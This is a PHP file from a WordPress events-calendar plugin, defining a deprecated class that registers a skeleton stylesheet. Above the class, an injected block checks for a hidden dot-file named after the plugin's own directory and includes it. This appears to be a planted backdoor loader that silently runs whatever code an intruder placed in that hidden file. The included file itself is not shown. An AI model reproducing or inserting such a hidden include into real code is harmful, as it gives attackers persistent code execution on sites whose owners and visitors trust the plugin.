<?php
_deprecated_file( __FILE__, '4.6.21', 'Deprecated class in favor of using `tribe_asset` registration' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Asset__Events_Css_Skeleton extends Tribe__Events__Asset__Abstract_Events_Css {

	public function handle( array &$stylesheets, $mobile_break ) {
		$stylesheets['tribe-events-calendar-style'] = 'tribe-events-skeleton.css';
	}
}